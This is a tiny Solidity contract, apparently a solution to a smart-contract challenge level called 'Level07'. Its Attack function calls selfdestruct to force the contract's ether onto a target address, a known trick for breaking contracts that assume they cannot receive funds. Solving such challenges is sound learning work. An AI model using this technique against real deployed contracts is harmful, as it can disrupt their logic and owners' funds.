// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level07.sol";

contract Attack {
    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
}
